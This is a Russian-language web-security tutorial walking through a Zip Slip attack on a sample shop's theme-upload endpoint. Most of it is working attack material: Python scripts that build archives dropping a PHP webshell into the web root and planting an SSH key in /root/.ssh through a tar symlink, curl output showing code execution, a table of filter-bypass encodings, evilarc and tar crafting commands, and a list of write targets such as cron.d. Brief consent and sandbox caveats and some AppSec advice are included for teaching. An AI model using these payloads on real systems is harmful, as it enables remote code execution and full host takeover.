## Вопрос, с которого всё начинается

На прошлом уроке мы загружали один файл. Но многие сайты принимают **архивы**: «импортируйте тему одним zip-файлом», «восстановите бэкап», «загрузите плагин». Сервер такой архив распаковывает — то есть сам создаёт файлы у себя на диске.

Вопрос: что, если имена файлов внутри архива заставить «вылезти» из папки распаковки? Тогда мы сможем записать файл куда угодно — например, прямо в каталог, откуда сайт исполняет код. Это называется **Zip Slip**, и сегодня мы пройдём его целиком на одном примере.

## Наш пример

Есть тот же магазин `app.example`, но теперь с админкой, где темы ставятся архивом. Находим форму импорта:

```bash
$ curl -s https://app.example/admin/themes -b 'session=admin' | grep -i upload
<form action="/admin/themes/upload" method="post" enctype="multipart/form-data">
  <input type="file" name="file" accept=".zip">
```

Отлично, эндпоинт — `POST /admin/themes/upload`, поле `file`, принимает `.zip`. Первым делом загрузим **безобидный** архив и посмотрим, как сервер его разбирает.

```bash
$ mkdir theme && printf 'body{}' > theme/style.css
$ (cd theme && zip -q ../theme.zip style.css)
$ curl -s -X POST https://app.example/admin/themes/upload -F 'file=@theme.zip' -b 'session=admin'
{"ok":true,"installed":"theme","files":1}
```

Сервер распаковал `style.css` и сообщил, что установил тему. Значит, он читает имена файлов из архива и пишет их на диск. Осталось проверить главное: **проверяет ли он, что путь остаётся внутри папки темы?**

## Шаг 1: делаем «вылезающее» имя

Имя записи внутри zip можно задать произвольно. `../` в пути означает «на уровень выше». Если положить в архив запись с именем `../../../var/www/html/evil.php`, при распаковке файл должен оказаться в веб-корне — если сервер не проверяет пути.

Соберём такой архив скриптом (обычный `zip` может не дать вписать `../`):

```bash
$ python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('evil.zip','w')
z.writestr('theme/style.css', 'body{}')                       # безобидный файл
z.writestr('../../../var/www/html/evil.php',
           '<?php system($_GET["c"]); ?>')                    # вылезающий webshell
z.close()
PY
$ unzip -l evil.zip
  Length      Name
        7      theme/style.css
       32      ../../../var/www/html/evil.php
```

Теперь загружаем и проверяем, куда попал второй файл:

```bash
$ curl -s -X POST https://app.example/admin/themes/upload -F 'file=@evil.zip' -b 'session=admin'
{"ok":true,"installed":"theme","files":2}
$ curl -s 'https://app.example/evil.php?c=id'
uid=33(www-data) gid=33(www-data)
```

`uid=33(www-data)` — webshell исполнился в веб-корне. Артефакт есть: сервер не проверил путь, и запись вышла из папки темы прямо в исполняемую директорию.

## Шаг 2: что делать, если простой `../` отфильтрован

Продвинутые приложения проверяют, что в имени нет `../`. Но проверки часто неполны. Переберём варианты, которыми обходят такие фильтры:

| Обход | Пример имени | Против чего работает |
|-------|--------------|----------------------|
| абсолютный путь | `/etc/cron.d/x` | проверка «останься внутри» |
| обратные слеши | `..\..\x` | unix-фильтр на Windows-сервере |
| URL-кодирование | `%2e%2e%2f` | фильтр строки `../` |
| двойное кодирование | `%252e%252e` | однократный декод |
| юникод | `..%c0%af` | ASCII-фильтр |
| симлинк | ссылка на `/root/.ssh` | любая проверка путей |

Все они делают одно и то же — заставляют итоговый путь оказаться вне целевого каталога. Начинай с самого простого (`../`), а при отказе спускайся по таблице.

## Шаг 3: симлинки — когда фильтр путей не помогает вообще

В tar-архивах (и некоторых zip) можно хранить **симлинк** — ссылку на другой файл или каталог. Атака в два хода: сначала архив создаёт симлинк на чувствительный каталог, затем пишет «через» него.

```bash
$ python3 - <<'PY'
import tarfile, io
t = tarfile.open('x.tar','w')
i = tarfile.TarInfo('.ssh'); i.type = tarfile.SYMTYPE; i.linkname = '/root/.ssh'
t.addfile(i)                                                  # ссылка .ssh -> /root/.ssh
key = b'ssh-rsa AAAA...attacker-key\n'
i2 = tarfile.TarInfo('.ssh/authorized_keys'); i2.size = len(key)
t.addfile(i2, io.BytesIO(key))                                # пишем "внутрь" ссылки
t.close()
PY
```

Проверка «путь внутри каталога» здесь проходит: имя `.ssh/authorized_keys` выглядит безопасно. Но `.ssh` — это симлинк на `/root/.ssh`, поэтому запись реально уходит туда. Если процесс распаковки работает от root, ты получаешь SSH-доступ по своему ключу. Это самый опасный вариант Zip Slip.

## Шаг 4: проверяем локально, прежде чем стрелять

Zip Slip — баг не приложения, а **библиотек распаковки** (Java `java.util.zip`, .NET, Go, Ruby, Python, Node, PHP). В 2018 году он затронул сотни проектов. Поэтому перед отправкой на цель проверь поведение в песочнице:

```bash
$ mkdir -p /tmp/sandbox/target && cd /tmp/sandbox
$ unzip -o evil.zip -d target/ 2>/dev/null
$ find /tmp/sandbox -name 'evil.php'
/tmp/sandbox/var/www/html/evil.php        # оказался ВНЕ target/ -> traversal
```

Файл лёг не в `target/`, а в `var/www/html/` — библиотека уязвима. Только после локального подтверждения отправляем архив на сервер. Так ты не тратишь запросы вслепую и не рискуешь продом зря.

## Шаг 5: куда писать и чем это грозит

Куда попадёт файл, зависит от прав процесса распаковки. Наиболее ценные цели:

- **Веб-корень** (`/var/www/html`, папка тем) → webshell → RCE (наш пример).
- **`/etc/cron.d/`** → задача по расписанию выполнит твой скрипт от root.
- **`~/.ssh/authorized_keys`** → вход по SSH.
- **Конфиги** (`settings.php`, `.env`, `web.config`) → подмена поведения приложения.

Если процесс распаковки работает от `www-data`, ты ограничен его правами; если от root — симлинк-атака даёт полный контроль над хостом.

## Шаг 6: чем создавать архив

Для простых случаев хватает `zip`/`tar`, но чтобы гарантированно вписать `../` в имя, удобнее скрипт на Python (как в шаге 1) или утилита `evilarc`:

```bash
$ python3 evilarc.py -d 5 -o unix -f evil.zip shell.php
$ tar --transform 's|^|../../../../|' -czf evil.tar.gz file
```

`-d 5` — сколько уровней `../` добавить, `-o unix` — стиль путей (есть и `windows`). Абсолютный путь (`/etc/cron.d/x`) тоже допустим: он не «выходит» через `../`, а сразу указывает точку назначения — против проверок «останься внутри каталога» это работает даже надёжнее.

## Что мы теперь знаем

- Zip Slip — это path traversal через **имена записей внутри архива**.
- Опасна любая распаковка пользовательского архива: темы, плагины, импорт, бэкапы, DOCX/XLSX (тоже zip).
- Фильтр `../` обходится абсолютными путями, слешами, кодированием, юникодом.
- Симлинки обходят проверку путей полностью.
- Проверять уязвимость безопаснее **локально в песочнице**.
- Артефакт — путь записи и результат (`id` или изменённый файл).

## На что смотреть дальше

- **Ищи любую распаковку:** `upload`, `import`, `extract`, `restore`, `unzip`, установка тем/плагинов.
- **Проверяй библиотеку локально** — не все распаковщики одинаковы; то, что работает в твоём `unzip`, может вести себя иначе на сервере.
- **Не забывай о правах процесса:** от них зависит, куда реально можно писать.
- **Zip bomb — родственник Zip Slip** (архив раздувается и забивает диск), но это DoS; проверяй без реального заполнения диска.
- **Связка с другими векторами:** если есть path traversal на чтение, Zip Slip даёт запись; если загрузка разрешает архивы, он превращает её в RCE.
- **Только с согласия.** Запись в cron/веб-корень — изменение прода.

## Куда дальше

Дальше мы уходим от «сервер исполняет мой файл» к «сервер сам собирает строку из моих данных» — это **SSTI**, когда шаблонизатор выполняет выражения, которые ты вписал в поле. А пока главное запомни: любая распаковка архива — это потенциальная запись файла, и `../` в имени записи ломает изоляцию папки.

## Где пригодится

- **CTF (Web):** задачи на импорт архивов.
- **Bug bounty:** zip-slip → RCE — критичный отчёт.
- **Пентест:** аудит распаковки/импорта.
- **Работа (AppSec):** нормализация и проверка путей, запрет симлинков, распаковка в изоляции.
